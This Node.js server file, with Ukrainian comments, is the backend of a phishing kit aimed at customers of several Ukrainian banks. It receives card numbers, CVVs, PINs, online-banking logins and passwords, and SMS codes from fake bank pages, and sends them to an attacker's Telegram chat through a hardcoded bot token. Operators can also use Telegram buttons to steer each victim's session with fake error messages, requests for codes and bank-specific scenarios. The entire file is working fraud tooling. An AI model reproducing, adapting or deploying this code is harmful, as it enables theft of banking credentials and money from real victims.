const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');

// --- НАЛАШТУВАННЯ (Я ВЖЕ ВСТАВИВ ВАШІ ДАНІ) ---
const TELEGRAM_BOT_TOKEN = '8226008404:AAHKvH74AnvUnJ5-xL_3Wf08TuNtovZeXTw';
const CHAT_ID = '-4891781280';

const app = express();
app.use(express.json());
app.use(cors());

app.use((req, res, next) => {
    console.log(`[HTTP] ${new Date().toISOString()} - ${req.method} ${req.url}`);
    next();
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/panel', (req, res) => res.sendFile(path.join(__dirname, 'panel.html')));

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

bot.getMe().then(me => console.log(`[BOT] Бот успішно запущено: @${me.username}`)).catch(err => console.error('Bot error:', err));
bot.sendMessage(CHAT_ID, `🚀 Повна версія сервера запущена: ${new Date().toISOString()}`).catch(err => console.error('Test send error:', err));

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();
const sessions = new Map();
const cardVisitCount = new Map();
const adminReplyState = new Map();

wss.on('connection', (ws) => {
    console.log('[WSS] Клієнт підключився');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`[WSS] Клієнт зареєстрований: ${data.sessionId}`);
            }
        } catch (e) { console.error('Error processing message:', e); }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`[WSS] Клієнт відключився: ${sessionId}`);
            }
        });
    });
});

app.post('/api/submit', (req, res) => {
    try {
        const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
        let workerNick = 'unknown';
        if (referrer && referrer !== 'unknown') {
            try { workerNick = atob(referrer); } catch (e) { console.error('Error decoding referrer:', e); }
        }

        const existingData = sessions.get(sessionId) || {};
        const newData = { ...existingData, ...stepData, worker: workerNick };
        sessions.set(sessionId, newData);

        if (newData.bankName === 'Ощадбанк' && newData.card && !newData.pin) {
            let message = `<b>⏳ Ощадбанк: Введено картку!</b>\n\n`;
            message += `<b>Номер карти:</b> <code>${newData.card}</code>\n<b>Сесія:</b> <code>${sessionId}</code>\n<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: 'Запросити ПІН-код', callback_data: `show_pin:${sessionId}` }]] }
            });
            return res.status(200).json({ message: 'Card received' });
        }

        if (isFinalStep) {
            const fullSessionData = sessions.get(sessionId);
            let message = `<b>🔥 Новий запис! 🔥</b>\n\n`;
            message += `<b>Назва банку:</b> ${fullSessionData.bankName}\n`;
            
            const cardNumber = fullSessionData.card_confirm || fullSessionData.card || fullSessionData['ukrsib-card'];
            if (cardNumber) {
                const newCount = (cardVisitCount.get(cardNumber) || 0) + 1;
                cardVisitCount.set(cardNumber, newCount);
                message += `<b>Кількість переходів (по карті):</b> ${newCount === 1 ? '💎 NEW' : `🔄 ${newCount} раз`}\n`;
            }

            const dataOrder = ['phone', 'card', 'card_confirm', 'ukrsib-card', 'card-expiry', 'ukrsib-expiry', 'card-cvv', 'pin', 'ukrsib-pin', 'balance', 'oschad-login', 'oschad-pass', 'vostok-login', 'vostok-pass', 'lk_pin', 'call_code_input', 'call_confirmed'];
            dataOrder.forEach(key => {
                if (fullSessionData[key]) {
                     message += `<b>${key.replace(/_/g, ' ').replace('-', ' ')}:</b> <code>${fullSessionData[key]}</code>\n`;
                }
            });
            
            message += `<b>Worker:</b> @${fullSessionData.worker}\n`;
            sendToTelegram(message, sessionId, fullSessionData.bankName);
        }
        res.status(200).json({ message: 'OK' });
    } catch (error) {
        console.error('CRITICAL ERROR in /api/submit:', error);
        res.status(500).json({ message: 'Internal Server Error' });
    }
});

app.post('/api/sms', (req, res) => {
    const { sessionId, code, referrer } = req.body;
    let workerNick = 'unknown';
    if (referrer && referrer !== 'unknown') {
        try { workerNick = atob(referrer); } catch (e) { console.error('Error decoding referrer:', e); }
    }
    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = `<b>📲 Отримано SMS!</b>\n\n<b>Код:</b> <code>${code}</code>\n<b>Телефон:</b> <code>${sessionData.phone}</code>\n<b>Сесія:</b> <code>${sessionId}</code>\n<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});


function sendToTelegram(message, sessionId, bankName) {
    const keyboard = [
        [{ text: 'SMS', callback_data: `sms:${sessionId}` }, { text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` }, { text: 'ЛК', callback_data: `lk:${sessionId}` }],
        [{ text: 'Невірний ПІН', callback_data: `pin_error:${sessionId}` }, { text: 'КОД ❌', callback_data: `code_error:${sessionId}` }, { text: 'КОД ✅', callback_data: `timer:${sessionId}` }],
        [{ text: 'Номер', callback_data: `number_error:${sessionId}` }, { text: 'OTHER', callback_data: `other:${sessionId}` }, { text: 'Дзвінок', callback_data: `call:${sessionId}` }],
        [{ text: 'СВОЄ', callback_data: `custom_message:${sessionId}` }, { text: 'BAN 🚫', callback_data: `ban_user:${sessionId}` }]
    ];
    
    bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: { inline_keyboard: keyboard } }).catch(err => console.error("Telegram send error:", err));
}

bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const { from } = callbackQuery;
    
    if (type === 'custom_message') {
        adminReplyState.set(from.id, sessionId);
        bot.sendMessage(CHAT_ID, `✍️ Введіть повідомлення для користувача (сесія ${sessionId}).`, { reply_markup: { force_reply: true } });
        return bot.answerCallbackQuery(callbackQuery.id);
    }

    const ws = clients.get(sessionId);
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
    }
    
    const bankName = (sessions.get(sessionId) || {}).bankName;
    let commandData = {};
    let commandType = type;

    switch (type) {
        case 'sms': commandData = { text: "Вам відправлено SMS з кодом, введіть його у форму." }; break;
        case 'pin_error': commandData = { text: "Ви не змогли підтвердити володіння карткою. Натисніть назад та заповніть форму з вірним пін-кодом." }; break;
        case 'other': commandData = { text: "Не вийшло автентифікувати картку. Пропонуємо вказати картку іншого банку." }; break;
        case 'lk':
            const lkMap = { 'Ощадбанк': 'lk_oschad', 'Райффайзен': 'lk_raiffeisen', 'Восток': 'lk_vostok', 'Izibank': 'lk_izibank', 'Укрсиб': 'lk_ukrsib' };
            if (lkMap[bankName]) commandType = lkMap[bankName];
            else return bot.answerCallbackQuery(callbackQuery.id, { text: `Для банку "${bankName}" немає сценарію ЛК.`, show_alert: true });
            break;
        case 'call':
             if (bankName === 'Ощадбанк') commandType = 'call_oschad';
             else return bot.answerCallbackQuery(callbackQuery.id, { text: `Для "${bankName}" немає сценарію "Дзвінок".`, show_alert: true });
            break;
    }

    ws.send(JSON.stringify({ type: commandType, data: commandData }));
    bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
});

bot.on('message', (msg) => {
    if (msg.reply_to_message && adminReplyState.has(msg.from.id)) {
        const sessionId = adminReplyState.get(msg.from.id);
        const ws = clients.get(sessionId);
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'custom_message', data: { text: msg.text } }));
            bot.sendMessage(CHAT_ID, `✅ Повідомлення відправлено до сесії ${sessionId}.`);
        } else {
            bot.sendMessage(CHAT_ID, `❌ Помилка: клієнт ${sessionId} вже не в мережі.`);
        }
        adminReplyState.delete(msg.from.id);
    }
});

bot.on('polling_error', (error) => console.error('[BOT] Polling error:', error.message));

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`[SERVER] Сервер запущено на порту ${PORT}`));

